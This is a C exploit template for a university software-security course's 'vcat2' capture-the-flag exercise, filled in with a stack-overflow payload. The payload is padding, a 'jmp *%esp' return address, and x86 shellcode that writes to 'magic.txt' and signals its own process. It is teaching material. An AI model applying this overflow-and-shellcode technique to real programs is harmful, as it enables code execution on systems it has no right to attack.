/*
 * CTF-2 `vcat2' exploit (template)
 *
 * Vasileios P. Kemerlis <vpk@cs.brown.edu>
 *  - CSCI 1650: Software Security and Exploitation
 *  - https://cs.brown.edu/courses/csci1650/
 */

#include <stdlib.h>
#include <unistd.h>

unsigned char payload[] =
	/* ------------------------------------	*/
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXX"
	/* ------------------------------------	*/
	"\x1d\x90\x04\x08" /* &'jmp *%esp'	*/
	/* ------------------------------------	*/
	/* FIXME */
	/* ------------------------------------	*/
   "\x68" "\x74\x78\x74\x2e"		// push "magic.txt"
   "\x68" "\x63\x69\x67\x61"
   "\x6a\x6d"

   "\x89\xe3"               	//mov    %esp,%ebx
   "\x6a\x01"                	//push   $0x1
   "\x59"                   	//pop    %ecx
   "\x31\xd2"               	//xor    %edx,%edx
   "\x6a\x05"                	//push   $0x5
   "\x58"                   	//pop    %eax
   "\xcd\x80"                	//int    $0x80
   "\x89\xc3"               	//mov    %eax,%ebx
   "\x68" "\x79\x7a\x7a\x79"	// push "xyyzz"
   "\x6a" "\x78"
   "\x89\xe1"              	//mov    %esp,%ecx
   "\x6a\x05"               	//push   $0x5
   "\x5a"                   	//pop    %edx
   "\x6a\x05"               	//push   $0x5
   "\x58"                   	//pop    %eax
   "\xcd\x80"               	//int    $0x80			




	/* ------------------------------------	*/
   "\x6a\x14"                	//push   $0x14
   "\x58"                   	//pop    %eax
   "\xcd\x80"                	//int    $0x80
   "\x89\xc3"              		//mov    %eax,%ebx
   "\x6a\x0c"                	//push   $0xc
   "\x59"                   	//pop    %ecx
   "\x6a\x25"                	//push   $0x25
   "\x58"                   	//pop    %eax
   "\xcd\x80";                	//int    $0x80
	/* ------------------------------------	*/


int
main(int argc, char **argv)
{
	/*
	 * dump the payload in 'stdout'
	 * sizeof(payload)-1:	ignore the trailing '\0';
	 *			(strings are NULL terminated)
	 */
	write(STDOUT_FILENO, payload, sizeof(payload)-1);

	/* done; success		*/
	return EXIT_SUCCESS;
}
